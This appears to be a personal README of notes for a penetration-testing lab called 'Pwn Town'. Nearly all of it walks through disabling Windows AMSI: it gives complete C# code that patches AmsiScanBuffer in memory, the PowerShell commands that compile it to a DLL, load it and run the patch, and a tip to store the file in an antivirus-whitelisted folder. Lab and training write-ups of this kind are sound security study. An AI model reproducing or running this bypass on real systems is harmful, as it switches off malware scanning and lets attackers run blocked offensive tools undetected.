# Pwn-Town
Here are all of my notes for the Pwn Town lab!

Starting out
---
The first thing you want to do is get everything prepared. Some things I would to (to make your life easier) is:
* On your local computer, save the RDP configuration to make connecting easier
* Find the `pentest-tools` folder on the lab machine and pin that to quick access

Bypassing AMSI
---
The first major hurdle is bypassing AMSI, or Antimalware Scan Interface. After trying to run some of the powershell tools, you'll quickly notice they can't run because they "contain malware".

```diff
Import-Module .\PowerSploit.psd1
-This script contains malicious content and has been blocked by your antivirus software.
```

The way we can bypass this is a little weird (but works). We're going to compile a C file into a DLL, then load that into powershell. This part of bypassing AMSI was found on [this website](https://www.citadel.co.il/Home/Blog/1008) which took a long time to find!

If you want, you can just download the DLL from this repository and skip to where I load it into powershell.

### Creating the C file
For this, just open up notepad and copy this code ([source](https://www.citadel.co.il/Home/Blog/1008)):

```
using System;
using System.Runtime.InteropServices;

namespace BP
{
    public class AMS
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static void Disable()
        {
            IntPtr AMSDLL = LoadLibrary("amsi.dll");
            IntPtr AMSBPtr = GetProcAddress(AMSDLL, "Am" + "si" + "Scan" + "Buffer");
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            VirtualProtect(AMSBPtr, dwSize, 0x40, out Zero);
            Byte[] Patch1 = { 0x31 };
            Byte[] Patch2 = { 0xff };
            Byte[] Patch3 = { 0x90 };
            IntPtr unmanagedPointer1 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch1, 0, unmanagedPointer1, 1);
            MoveMemory(AMSBPtr + 0x001b, unmanagedPointer1, 1);
            IntPtr unmanagedPointer2 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch2, 0, unmanagedPointer2, 1);
            MoveMemory(AMSBPtr + 0x001c, unmanagedPointer2, 1);
            IntPtr unmanagedPointer3 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch3, 0, unmanagedPointer3, 1);
            MoveMemory(AMSBPtr + 0x001d, unmanagedPointer3, 1);
            Console.WriteLine("Memory patched successfuly.");
        }
    }
}
```

Then, you can save this (maybe in a antivirus whitelisted folder>) as whatever you want, but I'm going to call it `AMSI.cs`.

### Compiling code into a DLL
Now, open up powershell change to the directory you saved the CS file in. Type this, replacing `<NAME>` with the name of the file you just created.

```
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\<NAME>.cs")) -OutputAssembly "AMSI.dll"
```

This with create a file called AMSI.dll.

### Loading the DLL into powershell
Now you should have the DLL called `AMSI.dll`. We need to load this into powershell to get around AMSI.

To do this, type:
`[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\AMSI.dll"))`

Then, the final step is to patch the memory:
`[BP.AMS]::Disable()`
